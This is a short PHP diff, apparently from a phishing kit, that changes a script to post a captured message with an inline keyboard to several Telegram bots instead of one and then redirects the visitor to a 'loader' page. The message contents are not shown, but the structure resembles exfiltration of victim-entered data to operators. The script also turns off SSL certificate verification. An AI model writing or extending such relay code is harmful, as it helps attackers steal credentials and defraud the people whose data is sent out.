@@ -220,21 +220,28 @@ $keyboard = [
 ];
 
 // 📤 Enviar a Telegram
-$url = "https://api.telegram.org/bot{$bot_token_2}/sendMessage";
-$payload = [
-    'chat_id' => $chat_id_2,
-    'text' => $message,
-    'reply_markup' => json_encode($keyboard),
-    'parse_mode' => 'Markdown'
-];
-$ch = curl_init($url);
-curl_setopt_array($ch, [
-    CURLOPT_POSTFIELDS => $payload,
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_SSL_VERIFYPEER => false
-]);
-curl_exec($ch);
-curl_close($ch);
+foreach ($telegram_accounts as $account) {
+
+    $url = "https://api.telegram.org/bot{$account['token']}/sendMessage";
+
+    $payload = [
+        'chat_id' => $account['chat_id'],
+        'text' => $message,
+        'reply_markup' => json_encode($keyboard),
+        'parse_mode' => 'Markdown'
+    ];
+
+    $ch = curl_init($url);
+
+    curl_setopt_array($ch, [
+        CURLOPT_POSTFIELDS => $payload,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false
+    ]);
+
+    curl_exec($ch);
+    curl_close($ch);
+}
 
 // 🔄 Redirigir a loader con el id actual
 header("Location: load.php?id=" . urlencode($request_id));
